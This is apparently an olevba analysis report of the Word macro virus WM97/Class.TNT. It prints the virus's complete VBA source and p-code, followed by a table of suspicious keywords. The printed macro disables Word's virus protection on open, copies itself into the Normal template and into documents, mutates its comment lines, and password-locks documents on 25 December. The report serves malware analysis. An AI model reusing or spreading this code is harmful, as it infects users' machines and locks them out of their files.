olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.TNT
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.TNT - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'7::$#H7:."4-B$H7:."4
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0
'7::$#H7:."4-B$H7:."4
Randomize
'7::$#H7:."4-B$H7:."4
On Error GoTo 93
'7::$#H7:."4-B$H7:."4
Options.VirusProtection = Chr(48)
'7::$#H7:."4-B$H7:."4
Options.SaveNormalPrompt = Chr(48)
'7::$#H7:."4-B$H7:."4
Options.ConfirmConversions = Chr(48)
'7::$#H7:."4-B$H7:."4
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'7::$#H7:."4-B$H7:."4
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'7::$#H7:."4-B$H7:."4
If dt > 0 And rt > 0 Then GoTo 93
'7::$#H7:."4-B$H7:."4
If dt = 0 Then
'7::$#H7:."4-B$H7:."4
    Set tnt = NormalTemplate.VBProject.VBComponents
'7::$#H7:."4-B$H7:."4
    Set hst = ActiveDocument.VBProject.VBComponents
'7::$#H7:."4-B$H7:."4
    If Month(Now()) = 12 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'7::$#H7:."4-B$H7:."4
    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(84) + Chr(78) + Chr(84)
'7::$#H7:."4-B$H7:."4
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "TNT"
'7::$#H7:."4-B$H7:."4
    hst.Item(Abs(1)).Name = tnt.Item(Abs(1)).Name
'7::$#H7:."4-B$H7:."4
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
'7::$#H7:."4-B$H7:."4
End If
'7::$#H7:."4-B$H7:."4
If rt = 0 Then Set tnt = ActiveDocument.VBProject.VBComponents
'7::$#H7:."4-B$H7:."4
tnt.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
'7::$#H7:."4-B$H7:."4
With tnt.Item(Abs(1)).codemodule
'7::$#H7:."4-B$H7:."4
    For j = Chr(49) To Chr(52)
'7::$#H7:."4-B$H7:."4
    .deletelines Chr(49)
'7::$#H7:."4-B$H7:."4
    Next j
'7::$#H7:."4-B$H7:."4
    End With
'7::$#H7:."4-B$H7:."4
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'7::$#H7:."4-B$H7:."4
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 99, "Sub ToolsMarco()"
'7::$#H7:."4-B$H7:."4
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'7::$#H7:."4-B$H7:."4
With tnt.Item(Abs(1)).codemodule
'7::$#H7:."4-B$H7:."4
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'7::$#H7:."4-B$H7:."4
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'7::$#H7:."4-B$H7:."4
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
'7::$#H7:."4-B$H7:."4
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'7::$#H7:."4-B$H7:."4
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'7::$#H7:."4-B$H7:."4
    If Month(Now()) = 12 And Day(Now()) = 26 Then .replaceline 87, ".replaceline j, ""'"" & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'7::$#H7:."4-B$H7:."4
    rd1 = Int(Rnd(1) * 40) + 1
'7::$#H7:."4-B$H7:."4
    If rd1 = 39 Then .replaceline 87, ".replaceline j, ""'"" & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'7::$#H7:."4-B$H7:."4
End With
'7::$#H7:."4-B$H7:."4
  With tnt.Item(Abs(1)).codemodule
'7::$#H7:."4-B$H7:."4
For j = Chr(50) To tnt.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'7::$#H7:."4-B$H7:."4
    r = Int(Rnd(412835) * 303989) + 8485
'7::$#H7:."4-B$H7:."4
    o = Int(Rnd(487958) * 785865) + 2988
'7::$#H7:."4-B$H7:."4
.replaceline j, "'" & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe
'7::$#H7:."4-B$H7:."4
    Next j
'7::$#H7:."4-B$H7:."4
 End With
'7::$#H7:."4-B$H7:."4
93:
'7::$#H7:."4-B$H7:."4
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'7::$#H7:."4-B$H7:."4
End Sub
'7::$#H7:."4-B$H7:."4
Sub ViewVBCode()
'7::$#H7:."4-B$H7:."4
End Sub 'WM97/Class.TNT by Virus :) Smile
'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4

'7::$#H7:."4-B$H7:."4
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.TNT
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9623 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix
' 	VarDefn xxi (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxe
' 	VarDefn xex
' 	VarDefn exx
' 	VarDefn exd
' 	VarDefn cxi
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #3:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #6:
' 	OnError 93 
' Line #7:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #14:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #15:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #16:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #17:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #18:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 93 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #20:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' Line #23:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #25:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "TNT"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #32:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #38:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #41:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #45:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #46:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #47:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #50:
' 	EndWith 
' Line #51:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #52:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #53:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #54:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #56:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #58:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #59:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #60:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0BB6 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsx 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St rox 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xix 
' Line #61:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #62:
' 	Ld rsx 
' 	ArgsLd Asc 0x0001 
' 	St cii 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eox 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnr 
' Line #63:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #64:
' 	Ld rox 
' 	ArgsLd Asc 0x0001 
' 	St cix 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxe 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0010 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rex 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exr 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrl 
' Line #65:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #66:
' 	Ld xix 
' 	ArgsLd Asc 0x0001 
' 	St xic 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nix 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0012 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixn 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxi 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnl 
' Line #67:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #68:
' 	Ld xxi 
' 	ArgsLd Asc 0x0001 
' 	St cxi 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St xxe 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xex 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exx 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St exd 
' Line #69:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #70:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	LitStr 0x0091 ".replaceline j, "'" & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #71:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #72:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0028 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rd1 
' Line #73:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #74:
' 	Ld rd1 
' 	LitDI2 0x0027 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	LitStr 0x009D ".replaceline j, "'" & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #75:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #76:
' 	EndWith 
' Line #77:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #78:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #79:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #80:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #81:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #82:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xA375 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #83:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #84:
' 	LitDI4 0x7216 0x0007 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xFDC9 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #85:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #86:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld eox 
' 	Concat 
' 	Ld rxe 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld xoe 
' 	Concat 
' 	Ld rex 
' 	Concat 
' 	Ld ixn 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld xxe 
' 	Concat 
' 	Ld xex 
' 	Concat 
' 	Ld exx 
' 	Concat 
' 	Ld exd 
' 	Concat 
' 	Ld oxe 
' 	Concat 
' 	Ld exr 
' 	Concat 
' 	Ld nix 
' 	Concat 
' 	Ld lnr 
' 	Concat 
' 	Ld nrl 
' 	Concat 
' 	Ld rnl 
' 	Concat 
' 	Ld xxe 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #87:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #88:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #90:
' 	EndWith 
' Line #91:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #92:
' 	LineNum 93 
' 	BoS 0x0000 
' Line #93:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #94:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #95:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #96:
' 	EndSub 
' Line #97:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #100:
' 	EndSub 
' 	QuoteRem 0x0008 0x0020 "WM97/Class.TNT by Virus :) Smile"
' Line #101:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #102:
' Line #103:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #104:
' Line #105:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #106:
' Line #107:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #108:
' Line #109:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #110:
' Line #111:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #112:
' Line #113:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x0017 "7::$#H7:."4-B$H7:."4"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
